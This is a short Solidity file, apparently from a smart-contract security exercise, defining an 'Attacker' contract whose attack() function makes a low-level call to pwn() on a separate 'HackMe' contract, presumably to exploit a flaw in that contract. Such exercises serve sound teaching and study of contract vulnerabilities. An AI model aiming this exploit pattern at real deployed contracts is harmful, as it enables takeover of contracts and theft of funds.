pragma solidity ^0.8.19;
// SPDX-License-Identifier: UNLICENSED
import "./HackMe.sol";

contract Attacker {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
       (bool success, bytes memory data) = hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}